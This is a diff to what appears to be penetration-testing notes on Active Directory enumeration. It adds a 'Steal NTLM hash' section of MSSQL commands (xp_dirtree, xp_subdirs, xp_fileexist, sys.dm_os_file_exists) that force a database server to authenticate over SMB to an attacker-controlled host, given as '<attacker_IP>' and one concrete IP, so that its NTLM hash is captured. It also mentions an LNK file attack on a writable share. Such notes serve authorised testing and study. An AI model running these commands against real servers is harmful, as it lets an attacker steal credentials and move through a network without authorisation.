@@ -9,6 +9,18 @@ Having domain credentials opens up a whole new world of enumeration possibilitie
 
 
 
+
+## Steal NTLM hash 
+
+```MSSQL
+xp_dirtree '\\<attacker_IP>\any\thing'
+exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
+EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
+EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
+
+SELECT * FROM sys.dm_os_file_exists('\\10.8.0.148\re\con');
+```
+
 ## LNK File Attack 
 
 Cool ! We got write access in the Custom Folder of the public Share . which is the `Folder for custom shortcuts & internet links.`
